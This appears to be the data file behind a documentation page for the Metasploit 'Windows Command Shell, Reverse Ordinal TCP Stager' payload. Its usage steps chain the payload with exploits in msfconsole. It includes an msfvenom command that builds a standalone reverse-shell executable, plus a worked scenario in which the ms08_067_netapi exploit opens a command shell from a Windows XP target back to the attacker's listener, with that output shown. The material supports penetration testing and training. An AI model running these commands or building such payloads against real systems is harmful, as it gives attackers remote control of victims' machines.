{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/windows/shell/reverse_ord_tcp","result":{"data":{"moduleMetadataJson":{"id":"eb4b415a-44d7-5e61-bc4a-c92c663e41be","name":"Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)","fullname":"payload/windows/shell/reverse_ord_tcp","description":"Spawn a piped command shell (staged). Connect back to the attacker","rank":300,"fields":{"detailsSlug":"/modules/details/payload/windows/shell/reverse_ord_tcp","documentationSlug":"/modules/documentation/payload/windows/shell/reverse_ord_tcp","referencesSlug":"/modules/references/payload/windows/shell/reverse_ord_tcp"},"documentation":{"html":"<h1 id=\"windows-command-shell\" style=\"position:relative;\"><a href=\"#windows-command-shell\" aria-label=\"windows command shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows Command Shell</h1>\n<p>Reverse Ordinal TCP Stager is an unique windows payload for Metasploit Framework.</p>\n<p>It is really small (&#x3C;100 bytes), it uses the existing ws2_32.dll in memory in connect and load the next stage of the payload. It provides a shell on the target machine which can be used to achieve almost anything on the target pc.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This Meterpreter payload is suitable for the following environments:</p>\n<ul>\n<li>Windows x86</li>\n<li>Windows x64</li>\n</ul>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<h3 id=\"as-a-payload-for-an-exploit\" style=\"position:relative;\"><a href=\"#as-a-payload-for-an-exploit\" aria-label=\"as a payload for an exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>As a payload for an exploit:</h3>\n<p>To check its compatibility with an exploit, select the exploit in the msf console and type the <code class=\"language-text\">info</code> command. The output will be similar to:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 payload(windows/shell/reverse_tcp) &gt; info\n\n       Name: Windows Command Shell, Reverse TCP Stager\n     Module: payload/windows/shell/reverse_tcp\n   Platform: Windows\n       Arch: x86\nNeeds Admin: No\n Total size: 283\n       Rank: Normal\n\nProvided by:\n  spoonm &lt;spoonm@no$email.com&gt;\n  sf &lt;stephen_fewer@harmonysecurity.com&gt;\n  hdm &lt;x@hdm.io&gt;\n  skape &lt;mmiller@hick.org&gt;\n\nBasic options:\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nEXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\nLHOST                      yes       The listen address (an interface may be specified)\nLPORT     4444             yes       The listen port\n\nDescription:\n  Spawn a piped command shell (staged). Connect back to the attacker</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If the platform field includes Windows, then windows/shell/reverse<em>ord</em>tcp can be used as the\npayload.</p>\n<p>To use at as a payload for an exploit, use the following commands:</p>\n<ol>\n<li>In msfconsole, select an exploit module compatible with windows.</li>\n<li>Configure the options for that exploit.</li>\n<li>Then run the following command: <code class=\"language-text\">set windows/shell/reverse_ord_tcp</code></li>\n<li>Set the <code class=\"language-text\">LHOST</code> option, to be the IP address that the payload should connect to.</li>\n<li>Then run the command: <code class=\"language-text\">exploit</code>.</li>\n</ol>\n<p>If the exploit is successful, the payload will get executed.</p>\n<h3 id=\"as-a-standalone-executable\" style=\"position:relative;\"><a href=\"#as-a-standalone-executable\" aria-label=\"as a standalone executable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>As a standalone executable</h3>\n<p>To use it as an executable, use the msfvenom tool. A typical example of doing this is as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p windows/shell/reverse_ord_tcp LHOST=192.168.23.1 LPORT=4444 -f exe -o /tmp/ordpayload.exe```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>The following commands are run on a Windows XP SP 2 English Machine:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/shell/reverse_ord_tcp\npayload =&gt; windows/shell/reverse_ord_tcp\nmsf exploit(windows/smb/ms08_067_netapi) &gt; use exploit/windows/smb/ms08_067_netapi\nmsf exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.56.3\nRHOST =&gt; 192.168.56.3\nmsf exploit(windows/smb/ms08_067_netapi) &gt; show options\n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    192.168.56.3     yes       The target address\n   RPORT    445              yes       The SMB service port (TCP)\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\n\nPayload options (windows/shell/reverse_ord_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.56.1     yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n\n\nmsf exploit(windows/smb/ms08_067_netapi) &gt; exploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The above commands will result into the following scenario, leading a shell\non the target machine:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] 192.168.56.3:445 - Automatically detecting the target...\n[*] 192.168.56.3:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English\n[*] 192.168.56.3:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)\n[*] 192.168.56.3:445 - Attempting to trigger the vulnerability...\n[*] Encoded stage with x86/shikata_ga_nai\n[*] Sending encoded stage (267 bytes) to 192.168.56.3\n[*] Command shell session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.3:1034) at 2018-08-17 15:25:02 +0530</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"eb4b415a-44d7-5e61-bc4a-c92c663e41be"}}}